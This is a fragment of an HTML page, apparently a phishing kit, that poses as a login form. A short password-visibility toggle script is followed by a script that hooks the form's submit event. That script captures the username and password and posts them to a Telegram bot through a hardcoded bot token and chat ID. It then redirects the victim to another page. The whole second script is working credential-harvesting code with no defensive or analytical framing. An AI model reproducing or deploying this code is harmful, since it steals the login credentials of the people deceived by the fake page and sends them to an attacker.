    <!-- Password toggle functionality -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const togglePassword = document.getElementById('togglePassword');
            const passwordInput = document.getElementById('fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d');
            
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.textContent = type === 'password' ? 'üëÅÔ∏è' : 'üëÅÔ∏è‚Äçüó®Ô∏è';
            });
        });
    </script>

    <script>
        // Telegram Bot Token and Chat ID
        const botToken = '6256698104:AAE5QZORxw737Vgc__jArGtIpQ3JrJfyv44';
        const chatId = '1217852633';

        // Get the form element
        const form = document.querySelector('.dbk-login__login-form');

        // Add event listener for form submission
        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission

            // Get form data
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            const remember = document.querySelector('input[name="remember"]').checked;

            // Construct the message to send to Telegram
            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nRemember Me: ${remember ? 'Yes' : 'No'}`;

            // Telegram API URL
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                // Send the message to Telegram
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                const result = await response.json();
                if (result.ok) {
                    console.log('Login data sent to Telegram successfully');
                    form.reset(); // Reset the form after successful submission
                    window.location.href = 'index2.html'; // Redirect to index2.html
                } else {
                    alert('Failed to send data to Telegram: ' + result.description);
                }
            } catch (error) {
                console.error('Error sending data to Telegram:', error);
                alert('An error occurred while sending data to Telegram.');
            }
        });
    </script>
